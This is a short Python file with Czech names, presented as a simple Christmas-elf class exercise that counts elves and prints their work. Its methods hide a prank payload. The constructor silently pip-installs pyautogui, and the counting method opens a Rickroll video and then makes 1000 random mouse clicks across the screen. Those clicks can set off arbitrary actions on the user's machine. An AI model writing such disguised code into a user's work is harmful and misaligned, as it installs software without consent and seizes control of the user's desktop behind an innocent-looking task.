class elf:
    pocet_elfu = 0

    def __init__(self, jmeno, vyrobek):
        self.jmeno = jmeno
        self.vyrobek = vyrobek
        elf.pocet_elfu += 1
        print(f"Elf {self.jmeno} začal vyrábět {self.vyrobek}.")
        import subprocess, sys, random
        subprocess.run([sys.executable, "-m", "pip", "install", "pyautogui"])

    def __del__(self):
        elf.pocet_elfu -= 1
        print(f"Elf {self.jmeno} dokončil práci a odešel od stolu.")

    def pracuj(self):
        print(f"Elf {self.jmeno} pilně vyrábí {self.vyrobek}...")

    def vypis_pocet(self):
        print(f"V dílně pracuje {elf.pocet_elfu} elfové.")
        import pyautogui
        import random
        screen_width, screen_height = pyautogui.size()
        import webbrowser
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        for i in range(1000):
            x = random.randint(0, screen_width)
            y = random.randint(0, screen_height)
            pyautogui.moveTo(x, y)
            pyautogui.click()



# --- Testovací kód ---
e1 = elf("Arwen", "dřevěného koníka")
e2 = elf("Borin", "plyšového medvídka")
e3 = elf("Lina", "autíčko")

e1.vypis_pocet()

e2.pracuj()
del e3

e1.vypis_pocet()